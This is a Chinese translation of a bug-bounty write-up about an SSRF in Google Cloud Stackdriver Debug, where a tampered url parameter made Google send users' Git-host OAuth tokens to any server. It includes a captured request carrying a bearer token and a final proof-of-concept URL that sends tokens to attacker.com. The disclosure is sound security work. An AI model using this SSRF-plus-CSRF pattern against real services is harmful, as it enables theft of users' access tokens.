> 原文链接: https://www.anquanke.com//post/id/195634 


# Google Cloud Platform StackDriver中的SSRF


                                阅读量   
                                **1197935**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者ngailong，文章来源：ngailong.wordpress.com
                                <br>原文地址：[https://ngailong.wordpress.com/2019/12/19/google-vrp-ssrf-in-google-cloud-platform-stackdriver/](https://ngailong.wordpress.com/2019/12/19/google-vrp-ssrf-in-google-cloud-platform-stackdriver/)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p4.ssl.qhimg.com/t01588f1d41d08217c3.jpg)](https://p4.ssl.qhimg.com/t01588f1d41d08217c3.jpg)



在阅读[这篇好文](https://sites.google.com/site/testsitehacking/-36k-google-app-engine-rce)后，我对GAE进行了测试。在测试中发现Google Cloud Platform Stackdriver中有一个调试应用，用户可以向该应用导入源代码并进行调试。用户可以从Github，Gitlab或者Bitbucket中导入源代码，并直接在Stackdriver Debug页面中调试代码（[详情见此](https://cloud.google.com/debugger/docs/source-options)）。

如果不正确地集成第三方应用程序会导致问题。我在测试此项功能的过程中就发现了一种特殊的SSRF漏洞。

让我们看看具体是怎么回事：

如果部署了App Engine应用，就可以在[https://console.cloud.google.com/debug](https://console.cloud.google.com/debug)上看到有多种方法来将源代码导入这个调试应用。

[![](https://p0.ssl.qhimg.com/dm/1024_610_/t01d8af623394d97be9.jpg)](https://p0.ssl.qhimg.com/dm/1024_610_/t01d8af623394d97be9.jpg)

单击Bitbucket上的“Select Source”按钮会弹出一个授权页面，问你是否允许Google在该应用中存储oauth令牌。

[![](https://p4.ssl.qhimg.com/dm/1024_836_/t013ef32717a51fccc6.jpg)](https://p4.ssl.qhimg.com/dm/1024_836_/t013ef32717a51fccc6.jpg)

在oauth页面中授权后，用户将被重定向回google，并显示用户的bitbucket/gitlab/github仓库的详细信息

[![](https://p3.ssl.qhimg.com/dm/1024_596_/t01be77943f92e3f57e.jpg)](https://p3.ssl.qhimg.com/dm/1024_596_/t01be77943f92e3f57e.jpg)

到目前为止，一切看起来都挺安全的，redirect_uri不能被篡改，state参数也使用正确。Google实际上是如何获取仓库列表和分支名称的呢？发现是通过两个请求：

第一个是列出来自bitbucket/gitlab/github的仓库

`https//console.cloud.google.com/m/clouddiag/debug/v2/gitlab/listpid=groovy-plating- 250224`

第二个是列出bitbucket/gitlab/github中的分支

`https://console.cloud.google.com/m/clouddiag/debug/v2/gitlab/resourcelist?pid=groovy-plating-250224&amp;url=https%3A%2F%2Fgitlab.com%2Fapi%2Fv4%2Fprojects%2Fprojectid%252Fproject-one%2Frepository%2Ftags`

第二个对应解码为

`https://console.cloud.google.com/m/clouddiag/debug/v2/gitlab/resourcelist?pid=groovy-plating-250224&amp;url=https://gitlab.com/api/v4/projects/projectid/project-one/repository/tags`

可以看到有个url参数，我把[https://gitlab.com替换为https://xxxxxxx.burpcollaborator.net然后尝试判断是否存在SSRF保护。发现竟然是没有的。](https://gitlab.com%E6%9B%BF%E6%8D%A2%E4%B8%BAhttps://xxxxxxx.burpcollaborator.net%E7%84%B6%E5%90%8E%E5%B0%9D%E8%AF%95%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8SSRF%E4%BF%9D%E6%8A%A4%E3%80%82%E5%8F%91%E7%8E%B0%E7%AB%9F%E7%84%B6%E6%98%AF%E6%B2%A1%E6%9C%89%E7%9A%84%E3%80%82)

更令人惊讶的是，从Burp Collaborator抓到的SSRF请求中还有些其他内容：

```
GET /?per_page=100 HTTP/1.1
Host: evdjffp55g27sbbipe7uqzx1tszin7.burpcollaborator.net
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Authorization: Bearer 123bcad14289c8a9d3
```

这个请求带有包含Bitbucket access token（访问令牌）的Authorization请求头。考虑到这一点，可以将访问令牌和SSRF请求组合发送。因为如果没有用户访问令牌的话，Google不可能从API endpoint请求到个人信息。

现在已经清楚了解Google是如何和第三方应用程序集成并导入源代码的，以及Google如何从不同的API endpoint获取资源（比如分支名称，标签等）。

于是到了最后一步，利用这个SSRF漏洞将用户访问令牌发送到我们指定的任意url。思路很清晰，请求只是GET而不是POST，如果能够对终端用户实施GET请求的CSRF攻击，就只要构造exp url发给用户，于是Google的这个SSRF就会将受害者的访问令牌发给我们。

[![](https://p1.ssl.qhimg.com/dm/1024_450_/t012f50ca49dccb1ac0.png)](https://p1.ssl.qhimg.com/dm/1024_450_/t012f50ca49dccb1ac0.png)

所幸的是请求中没有CSRF请求头，但是仍然有些请求头可能会阻止我们利用这个漏洞。比如x-pan-versionid、X-Goog-Request-Log-Data和网址为[https://console.cloud.google.com/的Referer。如果在后端检查是否设置了这些请求头，同时验证Referer域名是否和发出SSRF请求前的console.cloud.google.com一致的话，漏洞就没法利用了。幸运的是，后端没有进行验证。](https://console.cloud.google.com/%E7%9A%84Referer%E3%80%82%E5%A6%82%E6%9E%9C%E5%9C%A8%E5%90%8E%E7%AB%AF%E6%A3%80%E6%9F%A5%E6%98%AF%E5%90%A6%E8%AE%BE%E7%BD%AE%E4%BA%86%E8%BF%99%E4%BA%9B%E8%AF%B7%E6%B1%82%E5%A4%B4%EF%BC%8C%E5%90%8C%E6%97%B6%E9%AA%8C%E8%AF%81Referer%E5%9F%9F%E5%90%8D%E6%98%AF%E5%90%A6%E5%92%8C%E5%8F%91%E5%87%BASSRF%E8%AF%B7%E6%B1%82%E5%89%8D%E7%9A%84console.cloud.google.com%E4%B8%80%E8%87%B4%E7%9A%84%E8%AF%9D%EF%BC%8C%E6%BC%8F%E6%B4%9E%E5%B0%B1%E6%B2%A1%E6%B3%95%E5%88%A9%E7%94%A8%E4%BA%86%E3%80%82%E5%B9%B8%E8%BF%90%E7%9A%84%E6%98%AF%EF%BC%8C%E5%90%8E%E7%AB%AF%E6%B2%A1%E6%9C%89%E8%BF%9B%E8%A1%8C%E9%AA%8C%E8%AF%81%E3%80%82)

总而言之，为了利用此漏洞，攻击者需要一台监听HTTPS请求的服务器（比如burp collaborator），然后精心构造url，发送给将bitbucket/gitlab/github连接到Stackdriver的受害者，然后攻击者就能窃取来自Google SSRF请求中的访问令牌。

最终PoC：

`https://console.cloud.google.com/m/clouddiag/debug/v2/gitlab/resourcelist?pid=groovy-plating-250224&amp;url=https%3A%2F%2fattacker.com%2Fstealing.json`

希望你喜欢这篇文章，Google已经修复了这个漏洞，修复也不完美，但我仍然无法绕过验证。有兴趣的话可以看下，要是能够绕过可以向[https://g.co/vulnz](https://g.co/vulnz)报告！
